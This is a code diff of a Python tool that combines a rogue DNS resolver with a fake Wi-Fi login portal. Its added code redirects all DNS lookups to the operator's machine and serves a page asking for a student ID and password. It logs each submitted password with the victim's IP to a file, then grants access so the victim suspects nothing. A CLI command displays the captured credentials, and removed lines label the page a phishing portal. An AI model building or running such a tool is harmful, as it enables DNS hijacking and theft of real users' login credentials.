@@ -1,4 +1,3 @@
-
 import socket
 import threading
 import time
@@ -15,7 +14,6 @@ from urllib.parse import parse_qs
 log_flask = logging.getLogger('werkzeug')
 log_flask.setLevel(logging.ERROR)
 
-# --- Dynamic IP Discovery ---
 def get_dynamic_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
@@ -41,16 +39,8 @@ HTML_FILE = "index.html"
 # DoH Configuration
 DOH_PORT = 443
 DOH_ENDPOINT = "/dns-query"
-CERT_FILE = "cert.pem"
-KEY_FILE = "key.pem"
 
-# Captive Portal Hijack List
-CAPTIVE_PORTAL_DOMAINS = [
-    "www.msftconnecttest.com.", "ipv6.msftconnecttest.com.",
-    "www.msftncsi.com.", "captive.apple.com.",
-    "connectivitycheck.gstatic.com.", "detectportal.firefox.com."
-]
-
+# Full Global Server List for Propagation Test
 GLOBAL_SERVERS = {
     "Google Primary": "8.8.8.8", "Google Secondary": "8.8.4.4",
     "Cloudflare": "1.1.1.1", "Quad9": "9.9.9.9",
@@ -63,12 +53,13 @@ GLOBAL_SERVERS = {
     "Verisign Primary": "64.6.64.6", "Verisign Secondary": "64.6.65.6"
 }
 
-# Thread-safe storage
+# --- State Management ---
+REDIRECT_ALL = False
+WHITELISTED_IPS = set()  # Set to track IPs that have "logged in"
 cache = {}
 cache_lock = threading.Lock()
 log_lock = threading.Lock()
 
-# --- Utilities ---
 def log(message):
     with log_lock:
         timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
@@ -76,7 +67,7 @@ def log(message):
         with open(LOG_FILE, "a", encoding="utf-8") as f:
             f.write(entry + "\n")
 
-# FEATURE #1: Active Cache Cleaner
+# --- Active Cache Cleaner ---
 def cache_cleaner():
     while True:
         time.sleep(CACHE_CLEAN_INTERVAL)
@@ -87,7 +78,7 @@ def cache_cleaner():
             for key in expired_keys:
                 del cache[key]
                 removed += 1
-        log(f"cache cleanup run (removed {removed})")
+        if removed > 0: log(f"Cache cleanup: removed {removed} entries.")
 
 # --- DNS Core Logic ---
 def forward_query(data):
@@ -97,27 +88,25 @@ def forward_query(data):
         sock.sendto(data, (UPSTREAM_DNS, UPSTREAM_PORT))
         response, _ = sock.recvfrom(4096)
         return response
-    except socket.timeout:
-        log("upstream dns timeout")
-        return None
-    finally:
-        sock.close()
+    except Exception: return None
+    finally: sock.close()
 
-def process_dns_logic(data, protocol="UDP"):
+def process_dns_logic(data, client_ip, protocol="UDP"):
     try:
         request_pkt = DNSRecord.parse(data)
         qname = str(request_pkt.q.qname)
         qtype = request_pkt.q.qtype
-        log(f"Request [{protocol}]: FQDN={qname} Type={qtype}")
 
-        # Hijack Captive Portal Checks
-        if qtype == QTYPE.A and qname in CAPTIVE_PORTAL_DOMAINS:
-            log(f"HIJACK: {qname} -> Local Portal")
+        # 1. WHITELIST & REDIRECT CHECK
+        # Only hijack if REDIRECT_ALL is on AND the client hasn't logged in yet
+        if REDIRECT_ALL and qtype == QTYPE.A and client_ip not in WHITELISTED_IPS:
+            log(f"HIJACK [{protocol} {client_ip}]: {qname} -> {HOST}")
             reply = request_pkt.reply()
-            reply.add_answer(RR(qname, QTYPE.A, rdata=A(HOST), ttl=60))
+            # We use a very low TTL (5s) so that as soon as they log in, their cache clears
+            reply.add_answer(RR(qname, QTYPE.A, rdata=A(HOST), ttl=5))
             return reply.pack()
 
-        # Cache Lookup
+        # 2. CACHE LOOKUP (For whitelisted users or when redirect is OFF)
         with cache_lock:
             if (qname, qtype) in cache:
                 raw_resp, expiry = cache[(qname, qtype)]
@@ -125,76 +114,66 @@ def process_dns_logic(data, protocol="UDP"):
                     cached_resp = DNSRecord.parse(raw_resp)
                     cached_resp.header.id = request_pkt.header.id
                     return cached_resp.pack()
-                else:
-                    del cache[(qname, qtype)]
 
-        # Resolve Upstream
+        # 3. RESOLVE UPSTREAM
         response_data = forward_query(data)
         if response_data:
-            resp_pkt = DNSRecord.parse(response_data)
-            ttl = 60
-            if resp_pkt.rr:
-                ttl = min([rr.ttl for rr in resp_pkt.rr])
             with cache_lock:
-                cache[(qname, qtype)] = (response_data, time.time() + ttl)
+                cache[(qname, qtype)] = (response_data, time.time() + 60)
             return response_data
-
-    except Exception as e:
-        log(f"error processing request: {e}")
+    except Exception as e: log(f"Error processing {protocol}: {e}")
     return None
 
 # --- UDP Server ---
-def handle_client(data, addr, server_socket):
-    response = process_dns_logic(data, protocol=f"UDP {addr[0]}")
-    if response:
-        server_socket.sendto(response, addr)
+def handle_dns_client(data, addr, sock):
+    # Pass the client IP to the logic for whitelisting checks
+    resp = process_dns_logic(data, addr[0], f"UDP")
+    if resp:
+        sock.sendto(resp, addr)
 
-def run_dns_server():
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+def run_udp_server():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
-        # FEATURE #3: Permission Guard
-        server_socket.bind((HOST, PORT))
+        sock.bind((HOST, PORT))
         log(f"UDP Server Active on {HOST}:{PORT}")
         while True:
-            data, addr = server_socket.recvfrom(512)
-            threading.Thread(target=handle_client, args=(data, addr, server_socket), daemon=True).start()
+            data, addr = sock.recvfrom(512)
+            threading.Thread(target=handle_dns_client, args=(data, addr, sock), daemon=True).start()
     except PermissionError:
-        log("Permission denied for Port 53")
-        print("[!] FATAL: Permission denied for Port 53. Use sudo.")
+        print("[!] Access Denied: Port 53 requires sudo.")
         os._exit(1)
 
-# --- DoH & Phishing Portal ---
+# --- DoH & Web Portal ---
 app = Flask(__name__)
-
 @app.route(DOH_ENDPOINT, methods=['GET', 'POST'])
 def doh_handler():
     dns_query = None
-    if request.method == 'POST':
-        dns_query = request.data
+    if request.method == 'POST': dns_query = request.data
     elif request.method == 'GET':
         dns_b64 = request.args.get('dns')
-        if dns_b64:
-            padding = '=' * (4 - len(dns_b64) % 4)
-            dns_query = base64.urlsafe_b64decode(dns_b64 + padding)
-
-    if not dns_query: return "Invalid Request", 400
-
-    response_data = process_dns_logic(dns_query, protocol=f"DoH {request.remote_addr}")
-    if response_data:
-        resp = make_response(response_data)
-        resp.headers['Content-Type'] = 'application/dns-message'
-        return resp
-    return "Upstream Timeout", 504
+        if dns_b64: dns_query = base64.urlsafe_b64decode(dns_b64 + '=' * (4 - len(dns_b64) % 4))
+    if not dns_query: return "Bad Request", 400
+    
+    resp_data = process_dns_logic(dns_query, request.remote_addr, protocol="DoH")
+    if resp_data:
+        r = make_response(resp_data)
+        r.headers['Content-Type'] = 'application/dns-message'
+        return r
+    return "Timeout", 504
 
 class CaptivePortalHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
+        # Mandatory Windows 10 NCSI probe triggers
+        if "connecttest.txt" in self.path or "ncsi.txt" in self.path:
+            self.send_response(200); self.send_header('Content-type', 'text/plain'); self.end_headers()
+            self.wfile.write(b"Action Required")
+            return
+        
+        # Serve the index.html portal
+        self.send_response(200); self.send_header('Content-type', 'text/html'); self.end_headers()
         if os.path.exists(HTML_FILE):
             with open(HTML_FILE, "rb") as f: self.wfile.write(f.read())
-        else:
-            self.wfile.write(b"<h1>Portal</h1><p>Credentials Required.</p>")
+        else: self.wfile.write(b"<h1>Portal</h1><p>Login to connect to Wi-Fi.</p>")
 
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
@@ -202,79 +181,69 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         params = parse_qs(post_data)
         user = params.get('student_id', ['N/A'])[0]
         pw = params.get('password', ['N/A'])[0]
+        client_ip = self.client_address[0]
+
+        # 1. CAPTURE & WHITELIST
         with open(CREDS_FILE, "a") as f:
-            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] ID: {user} | Pass: {pw}\n")
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b"Success. Logging in...")
+            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] IP: {client_ip} | ID: {user} | Pass: {pw}\n")
+        
+        WHITELISTED_IPS.add(client_ip)
+        log(f"LOGIN SUCCESS: {client_ip} has been whitelisted and granted access.")
+
+        # 2. Redirect/Success Screen
+        self.send_response(200); self.send_header('Content-type', 'text/html'); self.end_headers()
+        self.wfile.write(b"<h1>Connected!</h1><p>Authentication successful. You now have full internet access.</p>")
+    
     def log_message(self, format, *args): pass
 
-def run_doh_server():
-    context = (CERT_FILE, KEY_FILE) if (os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE)) else 'adhoc'
-    app.run(host=HOST, port=DOH_PORT, ssl_context=context, threaded=True, use_reloader=False)
-
-# ONE-TIME Secret Listener
-def run_secret_listener():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        sock.bind(('0.0.0.0', 9999))
-        log("Secret listener active (One-time event)")
-        while True:
-            data, addr = sock.recvfrom(1024)
-            if data == b"IM_A_BARBIE_GIRL_IN_A_BARBIE_WORLD":
-                sock.sendto(b"COME_ON_BARBIE_LETS_GO_PARTY", addr)
-                log(f"Secret trigger matched from {addr[0]}. Closing listener.")
-                break # Close after one successful interaction
-    except Exception as e:
-        log(f"Secret listener error: {e}")
-    finally:
-        sock.close()
-
-# FEATURE #2: Latency Tracking
-def run_propagation_test(domain):
-    print(f"\n--- propagation test: {domain} ---")
-    print(f"{'provider':<20} | {'status/ip':<15} | {'latency'}")
-    print("-" * 55)
-    for name, ip in GLOBAL_SERVERS.items():
-        res = dns.resolver.Resolver(configure=False)
-        res.nameservers = [ip]
-        res.timeout = 2.0
-        start_time = time.time()
-        try:
-            answers = res.resolve(domain, 'A')
-            latency = round((time.time() - start_time) * 1000, 2)
-            print(f"{name:<20} | {answers[0].to_text():<15} | {latency}ms")
-        except:
-            print(f"{name:<20} | {'down/timeout':<15} | n/a")
-
-# --- Startup ---
+# --- Startup & CLI ---
 if __name__ == "__main__":
     os.system('clear' if os.name == 'posix' else 'cls')
-    print("-" * 60)
-    print(f"DNS SERVER FINAL STARTUP")
+    print("=" * 60)
+    print(f"DNS CAPTIVE PORTAL PRO-EDITION")
     print(f"Interface: {HOST}")
-    print(f"UDP: {PORT} | DoH: {DOH_PORT} | Web: 80")
-    print("-" * 60)
+    print("Commands: 'redirect', 'creds', 'clear', 'exit' or [domain]")
+    print("=" * 60)
 
+    # Launching Services
     threading.Thread(target=cache_cleaner, daemon=True).start()
-    threading.Thread(target=run_dns_server, daemon=True).start()
-    threading.Thread(target=run_doh_server, daemon=True).start()
-    threading.Thread(target=run_secret_listener, daemon=True).start()
+    threading.Thread(target=run_udp_server, daemon=True).start()
+    threading.Thread(target=lambda: app.run(host=HOST, port=443, ssl_context='adhoc', use_reloader=False), daemon=True).start()
     threading.Thread(target=lambda: HTTPServer((HOST, 80), CaptivePortalHandler).serve_forever(), daemon=True).start()
 
     while True:
         try:
-            cmd = input("\ndns-cli> ").strip()
-            if cmd.lower() in ['quit', 'exit']: break
-            elif cmd.lower() == 'creds':
+            cmd = input("\ndns-cli> ").strip().lower()
+            if not cmd: continue
+            if cmd in ['exit', 'quit']: break
+            
+            elif cmd == 'redirect':
+                REDIRECT_ALL = not REDIRECT_ALL
+                print(f"[*] Redirect Mode: {'ENABLED' if REDIRECT_ALL else 'DISABLED'}")
+            
+            elif cmd == 'creds':
                 if os.path.exists(CREDS_FILE):
+                    print(f"\n--- CAPTURED CREDS ---\n")
                     with open(CREDS_FILE, 'r') as f: print(f.read())
-                else: print("No credentials yet.")
-            elif cmd.lower() == 'status':
-                print(f"Interface: {HOST} | DNS/DoH/Web: Active | Cache: {len(cache)}")
-            elif cmd:
-                run_propagation_test(cmd)
+                else: print("[!] No creds yet.")
+
+            elif cmd == 'clear':
+                WHITELISTED_IPS.clear()
+                print("[*] Whitelist cleared. All clients are now blocked again.")
+            
+            else:
+                # Fallback: Run Propagation Test
+                print(f"\n--- Propagation Test: {cmd} ---")
+                print(f"{'Provider':<20} | {'Status/IP':<15} | {'Latency'}")
+                print("-" * 55)
+                for name, ip in GLOBAL_SERVERS.items():
+                    res = dns.resolver.Resolver(configure=False); res.nameservers = [ip]; res.timeout = 1.2
+                    start = time.time()
+                    try:
+                        ans = res.resolve(cmd, 'A')
+                        lat = round((time.time() - start) * 1000, 2)
+                        print(f"{name:<20} | {ans[0].to_text():<15} | {lat}ms")
+                    except: print(f"{name:<20} | Timeout          | n/a")
         except KeyboardInterrupt: break
 
-    print("\nSHUTDOWN: shutting down")
-    log("shutting down")
+    print("\nSHUTDOWN: Stopping all threads...")
